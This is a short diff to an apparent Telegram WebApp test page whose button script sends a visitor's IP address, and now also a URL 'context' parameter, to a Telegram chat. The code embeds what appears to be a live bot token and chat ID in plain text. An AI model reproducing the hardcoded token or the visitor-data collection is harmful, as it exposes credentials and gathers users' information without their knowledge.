@@ -43,7 +43,9 @@
     function sendMessage() {
 			const token = '5476946556:AAE64iQclmNuyKjkInVJtY5eqUqtDa3EoU4';
 			const chatId = '598045349';
-			const message = `Telegram ${document.getElementById('ipAddress').innerHTML}`;
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+			const message = `Telegram ${document.getElementById('ipAddress').innerHTML},,,, ${urlParams.get('context')}`;
 
 			const xhttp = new XMLHttpRequest();
 			xhttp.onreadystatechange = function() {
@@ -61,7 +63,6 @@
         Telegram.WebApp.showAlert('Alirezamhd')
     }
     test();
-    test2()
 </script>
 <body style="background-color: #ffffff">
 <button onclick="sendMessage()">Send message</button>
